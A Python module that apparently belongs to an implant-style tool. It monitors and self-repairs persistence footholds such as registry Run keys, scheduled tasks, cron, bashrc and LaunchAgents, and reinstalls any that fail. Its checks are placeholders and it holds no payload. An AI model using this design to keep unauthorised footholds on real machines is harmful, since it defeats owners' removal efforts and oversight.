"""
Persistence Monitor - Monitors persistence health and status
"""

import logging
from typing import Dict, List, Optional
from datetime import datetime
from enum import Enum

class PersistenceStatus(Enum):
    """Persistence status"""
    ACTIVE = "active"
    DEGRADED = "degraded"
    FAILED = "failed"
    REPAIRING = "repairing"

logger = logging.getLogger(__name__)

class PersistenceMonitor:
    """Monitors persistence mechanisms"""
    
    def __init__(self, persistence_manager):
        self.persistence_manager = persistence_manager
        self.status = PersistenceStatus.ACTIVE
        self.last_check_time = None
        self.active_mechanisms = []
        self.failed_mechanisms = []
        self.check_count = 0
        
    def check_persistence_health(self) -> Dict[str, any]:
        """Check health of all persistence mechanisms"""
        self.check_count += 1
        self.last_check_time = datetime.now()
        
        results = {
            'status': self.status.value,
            'timestamp': self.last_check_time.isoformat(),
            'active_mechanisms': [],
            'failed_mechanisms': [],
            'total_mechanisms': 0,
            'health_score': 100,
            'needs_repair': False
        }
        
        try:
            # Check if persistence manager exists
            if not self.persistence_manager:
                results['status'] = PersistenceStatus.FAILED.value
                results['health_score'] = 0
                results['needs_repair'] = True
                return results
            
            # Get platform
            import platform
            current_platform = platform.system().lower()
            
            # Check mechanisms based on platform
            mechanisms = self._get_platform_mechanisms(current_platform)
            results['total_mechanisms'] = len(mechanisms)
            
            active_count = 0
            for mechanism in mechanisms:
                if self._check_mechanism(mechanism):
                    results['active_mechanisms'].append(mechanism)
                    active_count += 1
                else:
                    results['failed_mechanisms'].append(mechanism)
            
            # Calculate health score
            if results['total_mechanisms'] > 0:
                results['health_score'] = int((active_count / results['total_mechanisms']) * 100)
            
            # Determine overall status
            if active_count == 0:
                self.status = PersistenceStatus.FAILED
                results['status'] = self.status.value
                results['needs_repair'] = True
            elif active_count < results['total_mechanisms']:
                self.status = PersistenceStatus.DEGRADED
                results['status'] = self.status.value
                results['needs_repair'] = True
            else:
                self.status = PersistenceStatus.ACTIVE
                results['status'] = self.status.value
                results['needs_repair'] = False
            
            self.active_mechanisms = results['active_mechanisms']
            self.failed_mechanisms = results['failed_mechanisms']
            
        except Exception as e:
            logger.error(f"Error checking persistence health: {e}")
            results['status'] = PersistenceStatus.FAILED.value
            results['health_score'] = 0
            results['needs_repair'] = True
        
        return results
    
    def _get_platform_mechanisms(self, platform: str) -> List[str]:
        """Get persistence mechanisms for platform"""
        if platform == 'windows':
            return ['registry', 'scheduled_task', 'service', 'startup_folder', 'runonce']
        elif platform == 'linux':
            return ['systemd', 'cron', 'initd', 'bashrc']
        elif platform == 'darwin':
            return ['launchagent', 'login_hook', 'bash_profile']
        else:
            return []
    
    def _check_mechanism(self, mechanism: str) -> bool:
        """Check if a specific mechanism is active"""
        # This would check actual system state
        # For now, return True as placeholder
        return True
    
    def repair_persistence(self) -> bool:
        """Attempt to repair failed persistence mechanisms"""
        logger.warning(f"Attempting to repair persistence...")
        self.status = PersistenceStatus.REPAIRING
        
        try:
            if self.persistence_manager:
                # Reinstall persistence
                success = self.persistence_manager.install_persistence()
                
                if success:
                    self.status = PersistenceStatus.ACTIVE
                    logger.info("Persistence repaired successfully")
                    return True
                else:
                    self.status = PersistenceStatus.FAILED
                    logger.error("Persistence repair failed")
                    return False
        except Exception as e:
            logger.error(f"Error repairing persistence: {e}")
            self.status = PersistenceStatus.FAILED
            return False
        
        return False
    
    def get_status_summary(self) -> Dict:
        """Get persistence status summary"""
        return {
            'status': self.status.value,
            'active_count': len(self.active_mechanisms),
            'failed_count': len(self.failed_mechanisms),
            'last_check': self.last_check_time.isoformat() if self.last_check_time else None,
            'check_count': self.check_count,
            'health_score': self.check_persistence_health()['health_score']
        }